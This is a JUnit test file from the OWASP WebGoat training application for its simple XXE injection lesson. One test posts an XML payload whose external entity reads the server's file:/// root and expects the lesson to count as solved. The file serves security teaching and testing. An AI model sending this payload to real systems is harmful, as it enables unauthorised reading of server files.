/*
 * SPDX-FileCopyrightText: Copyright © 2017 WebGoat authors
 * SPDX-License-Identifier: GPL-2.0-or-later
 */
package org.owasp.webgoat.lessons.xxe;

import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

import org.hamcrest.CoreMatchers;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.owasp.webgoat.WithWebGoatUser;
import org.owasp.webgoat.container.plugins.LessonTest;
import org.springframework.test.web.servlet.request.MockMvcRequestBuilders;
import org.springframework.test.web.servlet.setup.MockMvcBuilders;

@WithWebGoatUser
class SimpleXXETest extends LessonTest {

  @BeforeEach
  void setup() {
    this.mockMvc = MockMvcBuilders.webAppContextSetup(this.wac).build();
  }

  @Test
  void workingAttack() throws Exception {
    // Call with XXE injection
    mockMvc
        .perform(
            MockMvcRequestBuilders.post("/xxe/simple")
                .content(
                    "<?xml version=\"1.0\" standalone=\"yes\" ?><!DOCTYPE user [<!ENTITY root"
                        + " SYSTEM \"file:///\"> ]><comment><text>&root;</text></comment>"))
        .andExpect(status().isOk())
        .andExpect(
            jsonPath("$.feedback", CoreMatchers.is(messages.getMessage("assignment.solved"))));
  }

  @Test
  void postingJsonCommentShouldNotSolveAssignment() throws Exception {
    mockMvc
        .perform(
            MockMvcRequestBuilders.post("/xxe/simple")
                .content("<comment><text>test</ext></comment>"))
        .andExpect(status().isOk())
        .andExpect(
            jsonPath("$.feedback", CoreMatchers.is(messages.getMessage("assignment.not.solved"))));
  }

  @Test
  void postingXmlCommentWithoutXXEShouldNotSolveAssignment() throws Exception {
    mockMvc
        .perform(
            MockMvcRequestBuilders.post("/xxe/simple")
                .content(
                    "<?xml version=\"1.0\" standalone=\"yes\""
                        + " ?><comment><text>&root;</text></comment>"))
        .andExpect(status().isOk())
        .andExpect(
            jsonPath("$.feedback", CoreMatchers.is(messages.getMessage("assignment.not.solved"))));
  }

  @Test
  void postingPlainTextShouldThrowException() throws Exception {
    mockMvc
        .perform(MockMvcRequestBuilders.post("/xxe/simple").content("test"))
        .andExpect(status().isOk())
        .andExpect(
            jsonPath("$.output", CoreMatchers.startsWith("jakarta.xml.bind.UnmarshalException")))
        .andExpect(
            jsonPath("$.feedback", CoreMatchers.is(messages.getMessage("assignment.not.solved"))));
  }
}
